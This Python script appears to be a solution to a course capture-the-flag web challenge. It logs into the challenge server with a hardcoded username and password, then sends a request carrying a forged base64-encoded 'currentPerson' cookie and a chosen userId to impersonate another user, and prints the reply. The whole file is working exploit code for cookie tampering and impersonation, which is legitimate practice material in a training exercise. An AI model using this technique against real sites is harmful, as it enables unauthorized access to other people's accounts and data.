import requests,base64

loginpayload = {"login": "alexrose" , "pwd":"asdfqwerzxcv" }

session = requests.Session()

url = "http://cs495.oregonctf.org/login"

loginResponse = session.post(url, data=loginpayload)

targetUrl = "http://cs495.oregonctf.org/challenges/e40333fc2c40b8e0169e433366350f55c77b82878329570efa894838980de5b4"

postData = {"userId":"d3d9446802a44259755d38e6d163e820",
            "secure":"true"}

currentPerson = "MrJohnReillyTheSecond"
encodedPerson = base64.b64encode(bytes(currentPerson.encode("utf-8"))).decode("utf-8")
cookieData = {"currentPerson" : encodedPerson}

response2 = session.post(targetUrl, cookies=cookieData,data=postData )

print(response2.text)
